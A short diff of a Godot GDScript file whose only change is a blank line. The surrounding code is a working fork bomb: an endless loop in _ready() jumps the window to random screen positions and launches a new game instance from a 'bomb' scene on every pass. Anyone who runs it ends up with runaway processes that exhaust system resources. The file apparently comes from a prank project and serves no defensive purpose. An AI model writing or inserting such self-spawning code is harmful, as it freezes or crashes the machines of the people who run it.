@@ -5,3 +5,4 @@ func _ready():
 	while true:
 		get_window().position = Vector2(randi_range(0, DisplayServer.screen_get_size().x), randi_range(0, DisplayServer.screen_get_size().y))		
 		OS.create_instance(PackedStringArray(["res://internal/globalvar/bomb/bomb.tscn"]))
+	
